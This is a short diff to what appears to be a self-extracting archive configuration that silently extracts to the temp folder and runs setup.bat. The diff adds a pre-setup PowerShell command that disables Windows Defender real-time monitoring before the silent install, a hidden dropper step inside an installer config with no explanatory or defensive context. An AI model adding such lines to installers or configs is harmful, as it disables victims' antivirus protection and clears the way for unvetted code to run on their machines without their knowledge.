@@ -1,4 +1,5 @@
 Path=%systemdrive%\temp
+Presetup=powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true -Force
 Setup="%systemdrive%\temp\setup.bat"
 Silent=1
 Overwrite=1
